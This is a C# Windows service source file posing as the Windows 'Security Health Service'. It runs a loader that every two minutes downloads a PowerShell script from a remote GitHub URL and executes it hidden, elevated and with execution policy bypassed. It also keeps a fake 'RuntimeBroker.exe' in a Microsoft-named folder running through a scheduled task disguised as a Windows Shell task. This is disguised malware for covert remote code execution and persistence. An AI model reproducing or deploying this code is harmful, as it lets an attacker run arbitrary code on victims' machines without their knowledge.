using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace WindowsSecurityHealthService
{
    partial class SecurityHealthService : ServiceBase
    {
        static string versionUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/version";
        static string scriptUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/install.ps1";
        static string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
        static string currentDir = Path.Combine(appDataPath, @"Microsoft\RuntimeBroker");
        static string assemblyFile = Path.Combine(currentDir, "RuntimeBroker.exe");
        static string tempScriptPath = Path.Combine(Path.GetTempPath(), "install.ps1"); 
        static string taskName = "RuntimeBroker";

        public SecurityHealthService()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            // TODO: Add code here to start your service.

            int time = (int)TimeSpan.FromSeconds(120).TotalMilliseconds;

            Task.Run(async () =>
            {
                while (true)
                {
                    try
                    {
                        string serverVersion = GetServerVersion();
                        string assemblyVersion = GetAssemblyVersion();

                        if (serverVersion == null)
                        {
                            await Task.Delay(time);
                            continue;
                        }
                        else
                        {
                            if (assemblyVersion == null)
                            {
                                Console.WriteLine("A newer version is available. Downloading and running the update script...");
                                DownloadAndRunScript();
                            }
                            else
                            {
                                Console.WriteLine($"Server Version: {serverVersion}");
                                Console.WriteLine($"Assembly Version: {assemblyVersion}");

                                if (new Version(assemblyVersion) < new Version(serverVersion))
                                {
                                    Console.WriteLine("A newer version is available. Downloading and running the update script...");
                                    DownloadAndRunScript();
                                }
                                else
                                {
                                    Console.WriteLine("No update is needed. The assembly version is up-to-date.");
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                    finally
                    {
                        await Task.Delay(time);
                    }
                }
            });

            Task.Run(async () =>
            {
                while (true)
                {
                    try
                    {
                        // Check if Runtimebroker not running
                        if (!IsProcessRunning(assemblyFile))
                        {
                            Console.WriteLine("Checking if the RuntimeBroker task exists");
                            if (IsTaskExist(taskName))
                            {
                                Console.WriteLine("Run the RuntimeBroker task");
                                RunScheduledTask(taskName);
                            }
                            else
                            {
                                Console.WriteLine("Task does not exist, downloading and running the script");
                                DownloadAndRunScript();
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                    finally
                    {
                        await Task.Delay(time);
                    }
                }
            });

        }

        protected override void OnStop()
        {
            // TODO: Add code here to perform any tear-down necessary to stop your service.
        }

        public void OnStartManually(string[] args)
        {
            OnStart(args);
        }

        static string GetServerVersion()
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    string serverVersion = client.DownloadString(versionUrl);
                    return serverVersion.Trim();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to retrieve version from the server: {ex.Message}");
                return null;
            }
        }

        static string GetAssemblyVersion()
        {
            try
            {
                var versionInfo = FileVersionInfo.GetVersionInfo(assemblyFile);
                return versionInfo.ProductVersion;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to retrieve version from the assembly file: {ex.Message}");
                return null;
            }
        }

        static void DownloadAndRunScript()
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile(scriptUrl, tempScriptPath);
                }

                ProcessStartInfo startInfo = new ProcessStartInfo("powershell")
                {
                    Arguments = $"-ExecutionPolicy Bypass -File \"{tempScriptPath}\"",
                    Verb = "runas",
                    UseShellExecute = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(startInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to download or run the script: {ex.Message}");
            }
        }

        static bool IsProcessRunning(string filePath)
        {
            var processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(filePath));
            return processes.Any(p => p.MainModule.FileName.Equals(filePath, StringComparison.OrdinalIgnoreCase));
        }

        static void RunScheduledTask(string taskName)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo("powershell")
                {
                    Arguments = $"-Command \"if (Get-ScheduledTask -TaskName '{taskName}' -ErrorAction SilentlyContinue) {{ Start-ScheduledTask -TaskPath '\\Microsoft\\Windows\\Shell' -TaskName '{taskName}' }} else {{ Write-Host 'Error: Scheduled task {taskName} was not created successfully.'; exit 1 }}\"",
                    Verb = "runas",
                    UseShellExecute = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(startInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to run the scheduled task: {ex.Message}");
            }
        }

        static bool IsTaskExist(string taskName)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo("powershell")
                {
                    Arguments = $"-Command \"if (Get-ScheduledTask -TaskName '{taskName}' -ErrorAction SilentlyContinue) {{ return $true }} else {{ return $false }}\"",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using (Process process = Process.Start(startInfo))
                {
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string result = reader.ReadToEnd().Trim();
                        return result.Equals("True", StringComparison.OrdinalIgnoreCase);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to check if the task exists: {ex.Message}");
                return false;
            }
        }
    }
}
